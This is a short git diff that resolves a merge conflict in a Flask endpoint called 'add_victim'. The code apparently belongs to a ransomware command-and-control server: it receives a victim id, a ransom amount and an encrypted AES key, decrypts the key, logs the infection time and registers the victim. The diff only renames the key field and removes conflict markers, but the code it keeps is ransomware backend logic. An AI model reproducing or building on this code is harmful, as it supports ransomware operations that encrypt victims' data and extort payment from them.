@@ -44,27 +44,16 @@ def add_victim():
     #     return '400 Not Json'
     post_data = request.get_json()
     response_object = {'status': 'success'}
-<<<<<<< HEAD
-    print(type(post_data.get('AES_key')))
-    print(post_data.get('AES_key'))
-=======
     print(type(post_data.get('aes_key')))
     print(post_data.get('aes_key'))
->>>>>>> b33833f424f190a3d45f18dd6de8409bdcb4859d
     V.vicList.append({
             # 'id': uuid.uuid4().hex,
             'id': post_data.get('id'),
             'inf_time': time.ctime(),
             'ransom': post_data.get('ransom'),
-<<<<<<< HEAD
-            'AES_key': decrypt_key(post_data.get('AES_key'))
-        })
-    V.new_victim(vid=post_data.get('id'), pkey=decrypt_key(post_data.get('AES_key')))
-=======
             'aes_key': decrypt_key(post_data.get('aes_key'))
         })
     V.new_victim(vid=post_data.get('id'), pkey=decrypt_key(post_data.get('aes_key')))
->>>>>>> b33833f424f190a3d45f18dd6de8409bdcb4859d
     response_object['message'] = 'Victim added!'
     return jsonify(response_object)
 
